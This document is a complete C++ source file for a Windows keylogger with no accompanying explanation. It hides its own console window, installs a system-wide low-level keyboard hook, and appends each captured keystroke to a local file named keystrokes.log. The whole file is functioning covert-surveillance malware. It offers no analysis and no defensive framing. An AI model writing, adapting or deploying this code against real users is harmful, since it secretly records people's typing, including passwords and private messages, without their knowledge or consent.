#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

void log(string input) {
    fstream log_file;
    log_file.open("keystrokes.log", ios::app);
    log_file << input;
    log_file.close();
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);
    if (wParam == WM_KEYDOWN && p->vkCode != VK_RETURN) {
        string input = "";
        input += char(p->vkCode);
        log(input);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, GetModuleHandle(NULL), 0);
    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
